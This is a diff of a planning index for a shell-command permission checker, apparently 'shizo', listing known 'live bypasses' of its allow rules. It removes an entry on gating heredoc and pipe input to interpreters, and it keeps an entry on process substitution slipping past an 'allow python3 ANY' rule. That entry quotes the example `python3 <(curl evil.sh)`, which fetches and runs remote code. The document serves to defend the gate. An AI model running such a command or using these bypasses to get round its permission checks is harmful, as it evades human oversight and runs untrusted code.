@@ -2,10 +2,6 @@
 
 ## Live bypasses
 
-- [**stdin-gate**](plans/drafts/PLAN-stdin-gate.md)
-  > Add setting to deny stdin redirection at the AST level. shizo already parses the shell AST; it could detect heredocs (<<) and stdin pipes (|) feeding an interpreter and force those to ask or deny even if the base command is allowed. This narrows the attack surface without a blanket interpreter ban.
-  - Same class as the `<subst>` issue — shared design.
-
 - [**live bypass: `<subst>` matched by ANY/HAS**](plans/drafts/PLAN-subst-wildcard.md)
   > `allow python3 ANY` allows process substitution (`python3 <(curl evil.sh)`). Mitigated by the inner check. The interpreter runs content from a path shizo cannot see. The inner command is rule-checked separately, so exploiting it needs both halves allowed.
   - Overlaps the stdin gate
